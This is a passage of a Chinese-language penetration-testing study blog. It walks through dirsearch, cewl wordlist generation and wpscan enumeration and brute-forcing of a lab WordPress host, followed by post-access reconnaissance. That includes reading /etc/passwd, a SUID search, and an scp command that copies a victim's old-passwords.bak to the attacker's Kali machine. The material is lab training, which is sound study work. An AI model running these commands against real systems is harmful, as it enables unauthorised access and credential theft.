xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>dirsearch的命令这篇文章写的非常详细</p>\n<p><a href=\"https://blog.csdn.net/qq_43936524/article/details/115271837\">https://blog.csdn.net/qq_43936524/article/details/115271837</a></p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">dirsearch -u http:&#x2F;&#x2F;192.168.88.132:8848&#x2F; -e*\ndirsearch -u http:&#x2F;&#x2F;192.168.88.132:8848&#x2F; -e* -w  &#x2F;root&#x2F;dirsearch&#x2F;db&#x2F;dicc.txt &#x2F;&#x2F;指定字典\npython3 dirsearch.py -u http:&#x2F;&#x2F;192.168.52.143 -e * -i 200 --full-url --xml-report&#x3D;1.xml &#x2F;&#x2F;将检查结果以xml形式存放</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">常用命令 \n--version            显示dirsearch的版本\n-h --help            帮助提示\n-u  --url            指定网址\n-e                   指定网站语言\n-w                   指定字典\n-r                   递归目录（跑出目录后，继续跑目录下面的目录）\n-l  --url-list&#x3D;FILE  目标url文件路径\n-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)\n-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)\n</code></pre>\n\n\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221220225916377.png\" alt=\"image-20221220225916377\"></p>\n<h4 id=\"页面信息探测\"><a href=\"#页面信息探测\" class=\"headerlink\" title=\"页面信息探测\"></a>页面信息探测</h4><h5 id=\"Wappalyzer\"><a href=\"#Wappalyzer\" class=\"headerlink\" title=\"Wappalyzer\"></a>Wappalyzer</h5><p>Wappalyzer是一款功能强大的、且非常实用的chrome网站技术分析插件，通过该插件能够分析目标网站所采用的平台构架、</p>\n<p>网站环境、服务器配置环境、JavaScript框架、编程语言等参数，使用时很简单，开启你要分析、检测的网页后，点选该图示即可看到网站使用的相关技术和服务</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221220230119569.png\" alt=\"image-20221220230119569\"></p>\n<h5 id=\"cewl\"><a href=\"#cewl\" class=\"headerlink\" title=\"cewl\"></a>cewl</h5><p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p>\n<p><strong>默认方法</strong></p>\n<p>输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F;</code></pre>\n\n\n\n<p><strong>保存字典文件</strong></p>\n<p>为了方便大家记录，或者为将来的研究提供参考，Cewl可以将打印出的字典存储为文件。这里可以使用-w参数来将密码字典存储为text文件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -w dict.txt</code></pre>\n\n<p>我们可以使用下列命令查看密码字典是否存储成功，我们的存储路径为&#x2F;root &#x2F;dict.txt：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cat dict.txt</code></pre>\n\n\n\n<p><strong>生成特定长度的字典</strong></p>\n<p>如果你想生成指定长度的密码字典，你可以使用-m选项来设置：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -m 9</code></pre>\n\n<p>上述命令将生成长度至少为9位的密码，，Cewl对目标网站进行了爬取，并打印出了长度至少为9位的密码</p>\n<p><strong>从网站中获取Email</strong></p>\n<p>你可以使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -n -e</code></pre>\n\n<p>此时，工具成功在网站中发现了一个Email地址</p>\n<p><strong>计算网站字典中重复的单词数量</strong></p>\n<p>如果你想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -c</code></pre>\n\n<p>Cewl可以直接统计出目标网站中重复的单词数量</p>\n<p><strong>增加爬取深度</strong></p>\n<p>如果你想增加爬虫的爬取深度以生成更大的字典文件，你可以使用-d选项来指定爬取深度，默认的爬取深度为2：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -d 3</code></pre>\n\n\n\n<p><strong>提取调试信息</strong></p>\n<p>你可以使用–debug选项来开启调试模式，这样就可以查看网站爬取过程中出现的错误和元数据了：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; --debug</code></pre>\n\n\n\n<p><strong>Verbose模式</strong></p>\n<p>为了扩展网站爬取结果，并获取更加完整的数据报告，你可以使用-v选项来进入verbose模式。该模式下，Cewl会导出目标网站的详细数据：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -v</code></pre>\n\n\n\n<p><strong>生成包含数字和字符的字典</strong></p>\n<p>如果你想生成包含数字和字符的字典文件，你可以在命令中使用–with-numbers选项：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;testphp.vulnweb.com&#x2F; --with-numbers</code></pre>\n\n\n\n<p><strong>Cewl摘要&#x2F;基础认证</strong></p>\n<p>如果目标网站需要进行页面登录认证的话，我们就要使用下列参数来绕过页面认证的限制：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">–auth_type:                      Digest or basic.\n–auth_user:                     Authentication username.\n–auth_pass:                     Authentication password.\ncewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type Digest --auth_user admin--auth_pass password -v</code></pre>\n\n<p>或者</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl http:&#x2F;&#x2F;192.168.1.105&#x2F;dvwa&#x2F;login.php --auth_type basic --auth_user admin--auth_pass password -v</code></pre>\n\n<p>接收到的http响应码为200，并成功生成了字典</p>\n<p><strong>代理URL</strong></p>\n<p>如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典。此时你需要使用–proxy option选项来启用代理URL功能：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http:&#x2F;&#x2F;192.168.1.103&#x2F;wordpress&#x2F;</code></pre>\n\n\n\n<h5 id=\"wpscan\"><a href=\"#wpscan\" class=\"headerlink\" title=\"wpscan\"></a>wpscan</h5><p>​\tWPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.freebuf.com/sectool/174663.html\">https://www.freebuf.com/sectool/174663.html</a></p>\n<p><a href=\"https://blog.csdn.net/liver100day/article/details/117585795\">https://blog.csdn.net/liver100day/article/details/117585795</a></p></blockquote>\n<p><strong>扫描WordPress站点</strong></p>\n<p>我们可以使用–enumerate选项来扫描并发现关于目标站点主题、插件和用户名信息。输入下列命令开始对服务器进行扫描：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2</code></pre>\n\n<p>如果你不知道目标服务器的IP地址，你可以直接输入URL地址。</p>\n<p><strong>主题扫描</strong></p>\n<p>使用下列命令对主题进行扫描：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate t</code></pre>\n\n<p>使用下列命令扫描主题中存在的漏洞：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vt</code></pre>\n\n\n\n<p><strong>插件扫描</strong></p>\n<p>插件可以扩展WordPress站点的功能，但很多插件中都存在安全漏洞，而这也会给攻击者提供可乘之机。</p>\n<p>我们可以使用下列命令扫描WordPress站点中安装的插件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate p</code></pre>\n\n<p>接下来，我们可以使用下列命令来扫描目标插件中的安全漏洞：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp</code></pre>\n\n\n\n<p><strong>使用wpscan进行暴力破解</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 -P &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_passwords.txt -U &#x2F;home&#x2F;liver100day&#x2F;桌面&#x2F;dc2_username.txt</code></pre>\n\n\n\n<p><strong>命令集合</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wpscan --url http:&#x2F;&#x2F;dc-2 --enumerate vp,vt,tt,u</code></pre>\n\n\n\n\n\n<h3 id=\"主机信息收集\"><a href=\"#主机信息收集\" class=\"headerlink\" title=\"主机信息收集\"></a>主机信息收集</h3><h4 id=\"查看当前用户\"><a href=\"#查看当前用户\" class=\"headerlink\" title=\"查看当前用户\"></a>查看当前用户</h4><p><code>whoami</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221125739219.png\" alt=\"image-20221221125739219\"></p>\n<h4 id=\"查看内核版本信息\"><a href=\"#查看内核版本信息\" class=\"headerlink\" title=\"查看内核版本信息\"></a>查看内核版本信息</h4><p><code>uname -a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221130313831.png\" alt=\"image-20221221130313831\"></p>\n<p><code>lsb_release -a</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230102165857740.png\" alt=\"image-20230102165857740\"></p>\n<h4 id=\"查看账户信息文件\"><a href=\"#查看账户信息文件\" class=\"headerlink\" title=\"查看账户信息文件\"></a>查看账户信息文件</h4><p><code>cat /etc/passwd</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221130011269.png\" alt=\"image-20221221130011269\"></p>\n<p>可以收集到很多信息</p>\n<p>一般看到这种id就可以猜测是不是用户名了</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221144041465.png\" alt=\"image-20221221144041465\"></p>\n<p>可以通过<code>ls -l /home</code>查看home文件夹下有没有之前发现的用户名来验证用户信息</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221144329299.png\" alt=\"image-20221221144329299\"></p>\n<h4 id=\"收集用户信息\"><a href=\"#收集用户信息\" class=\"headerlink\" title=\"收集用户信息\"></a>收集用户信息</h4><p>通过之前验证的信息</p>\n<p>然后就可以用<code>ls</code>和<code>cat</code>依次遍历和查看用户文件夹收集信息</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221145857945.png\" alt=\"image-20221221145857945\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221145929213.png\" alt=\"image-20221221145929213\"></p>\n<p>查看指定文件有多少行<code>cat 文件名 | wc -l</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221150101706.png\" alt=\"image-20221221150101706\"></p>\n<p>把受害者主机中的文件拷贝到kali主机</p>\n<p><code>scp /home/space/music/1.mp3 root@www.runoob.com(或者ip):/home/root/others/music </code></p>\n<p>报错提示连接不上ssh</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221152234777.png\" alt=\"image-20221221152234777\"></p>\n<p>kali怎么开启ssh可以看这两篇文章</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.cnblogs.com/wangjinyu/p/12212536.html\">https://www.cnblogs.com/wangjinyu/p/12212536.html</a></p>\n<p><a href=\"https://www.cnblogs.com/dggsec/p/9465072.html\">https://www.cnblogs.com/dggsec/p/9465072.html</a></p></blockquote>\n<p><code>scp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221152911528.png\" alt=\"image-20221221152911528\"></p>\n<p>就可以成功把文件拷贝到kali上了</p>\n<h4 id=\"查看某个系统命令是否存在\"><a href=\"#查看某个系统命令是否存在\" class=\"headerlink\" title=\"查看某个系统命令是否存在\"></a>查看某个系统命令是否存在</h4><p>可以通过which来查看某个系统命令是否存在以及执行的到底是哪一个位置的命令</p>\n<p><code>which 可执行文件名称</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221221131011616.png\" alt=\"image-20221221131011616\"></p>\n<h4 id=\"查找SUID位的程序\"><a href=\"#查找SUID位的程序\" class=\"headerlink\" title=\"查找SUID位的程序\"></a>查找SUID位的程序</h4><p><code>find / -perm -u=s -user root 2&gt;/dev/null</code></p>\n<p>#-perm根据权限查找, -u&#x3D;s包含suid位的程序 -user root属主是root用户的, 2&gt;&#x2F;dev&#x2F;null 错误信息扔进垃圾桶</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230106232150666.png\" alt=\"image-20230106232150666\"></p>\n<ul>\n<li>逃避IDS&#x2F;IPS&#x2F;FW</li>\n<li>发现网络中开放的端口</li>\n<li>端口扫描工具</li>\n<li>识别服务（服务的指纹）</li>\n<li>OS类型</li>\n<li>服务枚举</li>\n<li>开源信息收集</li>\n</ul>\n<p>\t</p>\n<h2 id=\"3-漏洞探测\"><a href=\"#3-漏洞探测\" class=\"headerlink\" title=\"3.漏洞探测\"></a>3.漏洞探测</h2><h3 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">kali中的爆破字典位置 &#x2F;usr&#x2F;share&#x2F;wordlists  rockyou.txt</code></pre>\n\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221220232729123.png\" alt=\"image-20221220232729123\"></p>\n<p>一般默认是没有解压的,我们要自行解压</p>\n<p><code>gunzip /usr/share/wordlists/rockyou.txt.gz  </code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221220232859157.png\" alt=\"image-20221220232859157\"></p>\n<p>查看密码本大小及密码数量</p>\n<p><code>ls -lh /usr/share/wordlists/rockyou.txt</code>查看大小</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221220233223150.png\" alt=\"image-20221220233223150\"></p>\n<p><code>wc -l /usr/share/wordlists/rockyou.txt</code>查看条数</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221220233253191.png\" alt=\"image-20221220233253191\"></p>\n<p>可是看到kali自带的字典是很大的</p>\n<p>也可以自己设置字典</p>\n<p><code>cat &gt;&gt; 文件名.txt &lt;&lt; EOF</code></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20221220235129526.png\" alt=\"image-20221220235129526\"></p>\n<p>方法二：使用Hydra暴力破解密码</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>hydra使用教程</p>\n<p><a href=\"https://blog.csdn.net/huweiliyi/article/details/105523823\">https://blog.csdn.net/huweiliyi/article/details/105523823</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_43510203/article/details/107594228\">https://blog.csdn.net/weixin_43510203/article/details/107594228</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1595096\">https://cloud.tencent.com/developer/article/1595096</a></p></blockquote>\n<h3 id=\"端口敲门\"><a href=\"#端口敲门\" class=\"headerlink\" title=\"端口敲门\"></a>端口敲门</h3><p><strong>什么是端口敲门</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>参考文章</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/59488488\">https://zhuanlan.zhihu.com/p/59488488</a></p>\n<p><a href=\"https://www.cnblogs.com/wsjhk/p/5508051.html\">https://www.cnblogs.com/wsjhk/p/5508051.html</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/news/477568\">https://cloud.tencent.com/developer/news/477568</a></p></blockquote>\n<p>​\t端口敲门（Port knocking）技术，可以理解为密码或者暗号服务，简单来说，就是访问“预先设定好的顺序端口”，服务器收到某客户端的端口尝试序列后，动态修改防火墙规则，打开某特定端口,这时候，这个端口就可以被某IP进行访问了。访问顺序端口跟敲门一样，也类似于密码或者暗号。</p>\n<p><strong>提前要打开kali的ssh服务</strong></p>\n<p><strong>1.安装Knockd服务</strong></p>\n<p><code>apt-get install knockd</code></p>\n<p><strong>2.编辑配置文件</strong></p>\n<p>两个配置文件的位置:<code>/etc/konckd.conf</code>和<code>/etc/default/knockd</code></p>\n<p><code>vi /etc/konckd.conf </code></p>\n<p>基本不用怎么改动</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typoraimage-20230108220023450.png\" alt=\"image-20230108220023450\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[options]\n        UseSyslog\n#使用系统的日志文件记录Knockd的服务操作 &#x2F;var&#x2F;log&#x2F;messages\n[openSSH]\n        sequence    &#x3D; 7000,8000,9000 #序列\n        seq_timeout &#x3D; 30 #序列连接的超时时间,默认为5,强烈建议改长一点,比如30\n        command     &#x3D; &#x2F;sbin&#x2F;iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT #iptables是Linux的防火墙管理工具，-I 